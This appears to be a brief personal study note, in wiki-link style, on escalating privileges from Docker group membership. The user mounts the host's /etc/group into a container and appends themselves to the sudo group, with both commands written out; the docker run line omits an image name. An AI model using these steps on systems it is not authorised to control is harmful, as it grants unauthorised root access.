> The maxim DHBW case

[[Docker]], [[etc group]]
### Pre-Requisites
- A user added to the [[Docker]] group
- no other rights

## Steps
### 1. Docker container
Run a [[Docker Container]] in interactive mode, and [[Mount]] [[etc group]] file:

```bash
docker run -it -v /etc/group:/etc/group /bin/bash
```

> [!hint] Also changes the [[Docker Entrypoint|Entrypoint]] - not sure if that's actually necessary tho

### 2. Cat the username to the [[etc group]] file:
> [!hint] First: find out what the sudo group id is (i think 27 is standard but unsure)

```
root@container# grep sudo /etc/group
```

then: 
```
echo "sudo:x:27:$uid" >> /etc/group
```

aaaaand done